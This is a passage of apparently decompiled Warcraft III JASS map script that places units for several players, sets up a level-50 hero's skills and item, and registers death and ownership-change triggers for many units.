set Hu=CreateUnit(Ht,$4830344A,-15665.5,14119.3,229.79)
call SetHeroLevel(Hu,50,false)
call SetUnitState(Hu,UNIT_STATE_MANA,193)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305732)
call SelectHeroSkill(Hu,$41305732)
call SelectHeroSkill(Hu,$41305732)
call SelectHeroSkill(Hu,$41305732)
call SelectHeroSkill(Hu,$41305732)
call SelectHeroSkill(Hu,$41305732)
call SelectHeroSkill(Hu,$41305732)
call SelectHeroSkill(Hu,$41305732)
call SelectHeroSkill(Hu,$41305732)
call SelectHeroSkill(Hu,$41305732)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305734)
call SelectHeroSkill(Hu,$41305734)
call SelectHeroSkill(Hu,$41305734)
call SelectHeroSkill(Hu,$41305734)
call SelectHeroSkill(Hu,$41305734)
call SelectHeroSkill(Hu,$41305734)
call SelectHeroSkill(Hu,$41305734)
call SelectHeroSkill(Hu,$41305734)
call SelectHeroSkill(Hu,$41305734)
call SelectHeroSkill(Hu,$41305734)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313657)
call SelectHeroSkill(Hu,$41313657)
call SelectHeroSkill(Hu,$41313657)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305A44,0)
set Ki=CreateUnit(Ht,$68303052,4334.4,15498.,303.27)
set Kj=CreateUnit(Ht,$6E647268,-4234.7,13236.5,256.905)
call SetUnitState(Kj,UNIT_STATE_MANA,0)
set Kk=CreateUnit(Ht,$6F726169,7791.8,-2014.8,270.44)
set Kl=CreateUnit(Ht,$4F626C61,17994.4,1752.2,354.314)
call SetUnitState(Kl,UNIT_STATE_MANA,0)
set Km=CreateUnit(Ht,$6E686566,-15057.3,2274.5,72.137)
set Hu=CreateUnit(Ht,$6F657965,18044.6,1952.1,30.916)
set Hu=CreateUnit(Ht,$6F657965,18809.9,1174.6,348.288)
set Kn=CreateUnit(Ht,$4E616C63,7549.9,-1514.4,241.33)
call SetUnitState(Kn,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6F746F74,17993.3,2384.3,259.773)
set Hu=CreateUnit(Ht,$6F746F74,18604.2,2400.4,263.026)
set Hu=CreateUnit(Ht,$6F746272,17947.9,1967.7,303.603)
set Hu=CreateUnit(Ht,$6F777976,18325.5,1214.7,72.5)
set Ko=CreateUnit(Ht,$6F746175,18500.3,1216.5,85.134)
set Kp=CreateUnit(Ht,$6F636174,18043.5,1548.8,26.788)
set Kq=CreateUnit(Ht,$6E766C6B,-14320.4,192.3,70.387)
set Kr=CreateUnit(Ht,$6E766C6B,-14436.,298.1,20.491)
set Hu=CreateUnit(Ht,$6E76696C,-13086.3,1630.3,341.174)
set Hu=CreateUnit(Ht,$68303543,6971.5,-2616.5,45.)
set Ks=CreateUnit(Ht,$6830344D,-15872.9,-150.4,0.)
set Hu=CreateUnit(Ht,$6E65677A,-14786.8,1324.1,138.81)
set Kt=CreateUnit(Ht,$6E65677A,6986.5,-1509.3,283.09)
set Hu=null
endfunction
function mi takes nothing returns nothing
local player Ht=Player(9)
local unit Hu
set Hu=CreateUnit(Ht,$6F303038,14758.2,7120.3,283.536)
set Hu=null
endfunction
function mj takes nothing returns nothing
local player Ht=Player(10)
local unit Hu
local trigger Hc
set Hu=CreateUnit(Ht,$6E30305A,-2846.4,8432.7,159.36)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-2499.2,8386.4,31.05)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-3018.7,7946.2,144.6)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-3098.9,8272.8,57.58)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303033,-2759.8,8219.4,9.65)
set Hu=CreateUnit(Ht,$75303033,-2698.9,7988.,264.61)
set Hu=CreateUnit(Ht,$6E303059,-2324.7,8239.4,292.07)
set Hu=CreateUnit(Ht,$6E303059,-2348.,7992.8,179.62)
set Hu=CreateUnit(Ht,$6E30305A,-2512.9,7934.3,159.36)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303059,-15760.6,8360.7,269.01)
set Hu=CreateUnit(Ht,$6E303059,-15809.3,8125.7,221.81)
set Hu=CreateUnit(Ht,$6E303059,-14453.2,7265.,254.66)
set Hu=CreateUnit(Ht,$6E30305A,-15640.6,8230.7,292.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-15648.,8067.2,14.66)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-14675.1,7243.4,256.43)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-14434.3,7461.3,15.27)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-14604.4,7383.5,296.71)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-14831.9,7358.6,16.03)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-14551.,7588.1,123.2)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-15660.4,7907.5,359.33)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-15423.8,8117.7,56.16)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-15548.7,8433.2,8.34)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303059,-15391.9,8296.3,221.81)
set Hu=CreateUnit(Ht,$6E303059,-14765.2,7529.1,221.81)
set Hu=CreateUnit(Ht,$6E30305A,-15469.3,7911.5,14.66)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-14480.1,7727.5,14.66)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303034,-1198.5,8167.2,165.02)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l4)
set Hu=CreateUnit(Ht,$75303035,-15722.2,7407.,39.05)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mD)
set Hc=null
set Hu=null
endfunction
function mk takes nothing returns nothing
local player Ht=Player(11)
local unit Hu
set Hu=CreateUnit(Ht,$757A6731,23072.,3680.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,3680.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,3488.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,3296.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,3104.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,2912.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,2720.,270.)
set IM=CreateUnit(Ht,$68303132,-15360.,15680.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,2528.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,2336.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,2144.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,1952.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,1760.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,1568.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,1376.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,1184.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,992.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,800.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,608.,270.)
set Hu=CreateUnit(Ht,$757A6731,23072.,416.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,416.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,3488.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,3296.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,3104.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,2912.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,2720.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,2528.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,2336.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,2144.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,1952.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,1760.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,1568.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,1376.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,1184.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,992.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,800.,270.)
set Hu=CreateUnit(Ht,$757A6731,24160.,608.,270.)
set Hu=null
endfunction
function ml takes nothing returns nothing
local player Ht=Player(11)
local unit Hu
local trigger Hc
set Ku=CreateUnit(Ht,$6E303334,12283.5,-6243.4,160.04)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Ku,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Ku,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mG)
set Kv=CreateUnit(Ht,$6E30304F,3543.4,-22496.3,91.91)
set Hu=CreateUnit(Ht,$6E303048,-10127.6,-6524.,129.59)
set Kw=CreateUnit(Ht,$6E303844,18543.5,-23248.4,270.)
set Kx=CreateUnit(Ht,$6E303630,5866.6,12273.9,270.)
set Ky=CreateUnit(Ht,$6E303339,-12149.,-23486.8,261.69)
set Kz=CreateUnit(Ht,$6E303433,-4943.9,-23378.8,270.53)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Kz,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Kz,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l4)
set K0=CreateUnit(Ht,$6E303654,11020.6,7711.7,265.129)
set K1=CreateUnit(Ht,$6E30304A,1339.5,-23724.1,90.)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K1,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,K1,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mB)
set K2=CreateUnit(Ht,$75303030,-14072.8,-13566.7,188.94)
set K3=CreateUnit(Ht,$6E303539,-7793.9,-21483.9,268.33)
set K4=CreateUnit(Ht,$6E303231,1760.4,11982.5,170.1)
set K5=CreateUnit(Ht,$6E303052,6375.4,-23624.8,90.72)
call SetUnitState(K5,UNIT_STATE_MANA,0)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K5,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,K5,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l5)
set K6=CreateUnit(Ht,$6E687963,13554.6,3300.7,261.47)
set K7=CreateUnit(Ht,$6830304F,5238.7,15484.2,236.454)
call SetUnitState(K7,UNIT_STATE_MANA,0)
set K8=CreateUnit(Ht,$75303054,-5712.,-21067.3,267.344)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K8,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,K8,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l8)
set K9=CreateUnit(Ht,$6E303130,8817.6,-23721.1,273.62)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,K9,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,K9,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l5)
set LB=CreateUnit(Ht,$6E303353,3586.9,-23250.1,93.57)
set LC=CreateUnit(Ht,$68303141,-5153.,15685.1,264.65)
set LD=CreateUnit(Ht,$6E30324F,7747.4,5912.8,331.22)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LD,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LD,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mM)
set LE=CreateUnit(Ht,$6E303749,-2914.,-23456.,270.)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LE,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LE,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l7)
set LF=CreateUnit(Ht,$6E30374A,-843.7,-23465.6,270.)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LF,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LF,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l7)
set LG=CreateUnit(Ht,$6E303230,-9520.2,12939.8,194.95)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LG,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LG,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mJ)
set LH=CreateUnit(Ht,$6E303232,11513.7,-23412.,270.)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LH,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LH,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l7)
set LI=CreateUnit(Ht,$68303454,-406.8,15827.9,145.97)
set LJ=CreateUnit(Ht,$68303250,-6128.5,9753.6,273.69)
set Hu=CreateUnit(Ht,$6E303252,5891.1,-7610.1,92.954)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mC)
set LK=CreateUnit(Ht,$6E303250,15721.5,2624.4,247.66)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LK,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LK,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mL)
set LL=CreateUnit(Ht,$6E303254,-13566.6,-15053.6,80.43)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LL,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LL,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l0)
set LM=CreateUnit(Ht,$6E303255,-13577.1,-16082.2,118.38)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LM,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LM,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l0)
set LN=CreateUnit(Ht,$6E303256,-12341.4,-16059.8,185.07)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LN,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LN,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l0)
set LO=CreateUnit(Ht,$6E303257,-11370.4,-16224.9,175.89)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LO,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LO,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l1)
set LP=CreateUnit(Ht,$6E303552,7011.3,4587.9,281.39)
set LQ=CreateUnit(Ht,$6E303331,14080.3,-23260.4,270.)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LQ,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LQ,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l9)
set LR=CreateUnit(Ht,$6E303445,3963.9,2185.2,182.15)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LR,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LR,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mQ)
set LS=CreateUnit(Ht,$65303049,-16036.,-16176.2,47.715)
set LT=CreateUnit(Ht,$6E303356,-8593.6,-23446.8,264.9)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LT,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LT,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l3)
set LU=CreateUnit(Ht,$68303045,-14077.3,10471.2,270.07)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LU,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LU,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mP)
set LV=CreateUnit(Ht,$75303049,-6676.3,-23462.4,278.84)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LV,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LV,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l4)
set LW=CreateUnit(Ht,$68303233,-9952.1,-20405.5,265.23)
call SetUnitColor(LW,ConvertPlayerColor(0))
set LX=CreateUnit(Ht,$6E303057,440.6,3618.9,136.52)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LX,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LX,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l2)
set LY=CreateUnit(Ht,$6E303051,-2432.6,-11311.,94.775)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LY,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LY,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l1)
set LZ=CreateUnit(Ht,$6E30324E,-9102.,-12183.7,127.927)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LZ,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,LZ,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l0)
set La=CreateUnit(Ht,$6E30304B,-9782.6,-14875.3,329.89)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,La,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,La,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l0)
set Lb=CreateUnit(Ht,$6E30304C,-10361.3,-11843.7,263.08)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lb,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lb,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l0)
set Lc=CreateUnit(Ht,$6E30304E,-6187.9,-11113.6,269.39)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lc,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lc,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l0)
set Ld=CreateUnit(Ht,$6E303352,-10453.3,-23376.9,268.47)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Ld,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Ld,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l3)
set Le=CreateUnit(Ht,$6E30304D,-3858.1,-10399.8,194.766)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Le,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Le,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l0)
set Lf=CreateUnit(Ht,$68303035,-5129.5,-2821.6,199.55)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lf,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lf,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l0)
set Lg=CreateUnit(Ht,$6E303338,8701.4,7853.3,273.471)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lg,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lg,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l5)
set Lh=CreateUnit(Ht,$7530304C,-15740.,10261.2,273.62)
set Li=CreateUnit(Ht,$7530304A,-15742.4,12319.4,273.43)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Li,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Li,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mO)
set Lj=CreateUnit(Ht,$6E303754,21404.3,2659.6,267.62)
set Hu=CreateUnit(Ht,$6830334A,-5673.2,-10672.3,103.03)
set Lk=CreateUnit(Ht,$6E30354B,7999.1,12016.1,247.58)
set Ll=CreateUnit(Ht,$6830324F,-15162.4,-23518.2,269.68)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Ll,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Ll,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l9)
set Lm=CreateUnit(Ht,$6F303047,-12364.2,-15126.7,152.87)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lm,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lm,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mS)
set Ln=CreateUnit(Ht,$6530304C,-6530.2,1962.6,228.719)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Ln,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Ln,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mT)
set Lo=CreateUnit(Ht,$6E303553,6672.1,9510.5,269.12)
set Lp=CreateUnit(Ht,$75303050,-15775.6,-10392.1,38.1)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lp,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lp,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l3)
set Hu=CreateUnit(Ht,$6E303530,593.4,-4878.2,272.068)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l1)
set Lq=CreateUnit(Ht,$75303052,-11053.,4300.7,353.638)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lq,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lq,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mH)
set Lr=CreateUnit(Ht,$6E303554,9521.5,9700.5,270.)
set Ls=CreateUnit(Ht,$6E303555,4298.2,9599.9,319.36)
set Lt=CreateUnit(Ht,$68303548,439.2,-14014.1,185.05)
set Hu=CreateUnit(Ht,$68303537,7556.8,12151.5,0.)
set Hu=CreateUnit(Ht,$68303537,8469.7,12191.8,0.)
set Hu=CreateUnit(Ht,$68303537,7585.6,11334.8,0.)
set Lu=CreateUnit(Ht,$6E303456,-12384.2,-21066.6,266.68)
set Lv=CreateUnit(Ht,$6E676831,17782.7,9472.3,61.16)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lv,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lv,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l4)
set Lw=CreateUnit(Ht,$6E6D6764,23971.7,15117.4,299.3)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lw,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lw,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l6)
set Lx=CreateUnit(Ht,$6E667065,19713.3,14894.,241.75)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Lx,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Lx,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function l5)
set Ly=CreateUnit(Ht,$6E303547,16108.7,-23110.5,268.66)
set Lz=CreateUnit(Ht,$6E303548,-15476.5,-19064.1,270.)
set L0=CreateUnit(Ht,$6830334E,-15545.1,-15232.1,289.86)
set L1=CreateUnit(Ht,$6830334B,-1044.1,7963.1,262.2)
set L2=CreateUnit(Ht,$6830334C,4621.8,-2571.5,340.78)
set L3=CreateUnit(Ht,$6830334D,1424.3,13225.2,26.02)
set L4=CreateUnit(Ht,$6E303537,-2312.3,15463.5,265.94)
set Hu=CreateUnit(Ht,$68303537,8394.4,11311.9,0.)
set L5=CreateUnit(Ht,$75303055,-15243.2,-21167.2,265.405)
set L6=CreateUnit(Ht,$6830344F,2813.3,-9571.1,186.13)
set Hu=CreateUnit(Ht,$6E303757,23885.9,3593.1,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23857.2,3374.6,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,23972.5,3744.3,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303756,23728.8,3612.,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,23475.9,3067.8,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23447.1,2849.2,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,23562.4,3218.9,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303756,23318.8,3086.6,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,23860.1,2671.3,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23831.4,2452.8,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,23946.7,2822.5,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303756,23703.,2690.1,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,23524.1,2044.2,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23495.3,1825.6,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,23610.6,2195.3,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303756,23366.9,2063.,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,23849.7,1432.4,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23820.9,1213.9,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,23936.2,1583.6,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303756,23692.5,1451.2,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,23456.9,986.5,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23428.2,768.,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,23543.5,1137.7,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303756,23299.8,1005.3,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,23385.1,3483.4,51.798)
set Hu=CreateUnit(Ht,$6E303755,23781.8,3047.2,51.798)
set Hu=CreateUnit(Ht,$6E303755,23439.1,2465.2,51.798)
set Hu=CreateUnit(Ht,$6E303755,23832.4,1944.1,51.798)
set Hu=CreateUnit(Ht,$6E303755,23386.2,1451.5,51.798)
set Hu=CreateUnit(Ht,$6E303755,23775.9,843.7,51.798)
